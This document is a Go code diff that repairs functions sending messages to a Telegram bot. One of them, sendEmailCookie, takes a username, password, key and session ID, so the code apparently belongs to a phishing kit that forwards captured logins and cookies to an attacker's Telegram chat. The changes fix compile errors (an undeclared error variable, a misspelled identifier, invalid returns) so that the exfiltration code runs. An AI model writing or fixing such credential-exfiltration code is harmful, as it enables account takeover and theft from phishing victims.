@@ -49,7 +49,8 @@ func getChatId() string {
 }
 
 func telegramSendResult(msg string){
-	
+	var err error
+
 	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
 	// Send the message
 	url := fmt.Sprintf("%s/sendMessage", getUrl())
@@ -66,7 +67,7 @@ func telegramSendResult(msg string){
 	// Body
 	body, err = ioutil.ReadAll(request.Body)
 	if err != nil {
-		return false, err
+		log.Fatalf("%s", err)
 	}
 	log.Printf("%s", msg)
 
@@ -75,6 +76,8 @@ func telegramSendResult(msg string){
 func sendEmailCookie(msg string, username string, password string, KeyUser string, sessionId string) {
 
 	// Send the message
+	var err error
+
 	url := fmt.Sprintf("%s/sendMessage", getUrl())
 
 	postBody, _ := json.Marshal(map[string]string{
@@ -102,6 +105,8 @@ func sendEmailCookie(msg string, username string, password string, KeyUser strin
 }
 
 func telegramSendVisitor(msg string) {
+	var err error
+
 	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
 	
 	url := fmt.Sprintf("%s/sendMessage", getUrl())
@@ -113,12 +118,12 @@ func telegramSendVisitor(msg string) {
 	request, _ := http.Post(url, "application/json", responseBody)
 
 	// Close the request at the end
-	defer reqest.Body.Close()
+	defer request.Body.Close()
 	
 	// Body
 	body, err = ioutil.ReadAll(request.Body)
 	if err != nil {
-		return false, err
+		log.Fatalf("%s", err)
 	}
 	fmt.Println("Successfully sent mail to all user in telegram: %s", msg)
 }
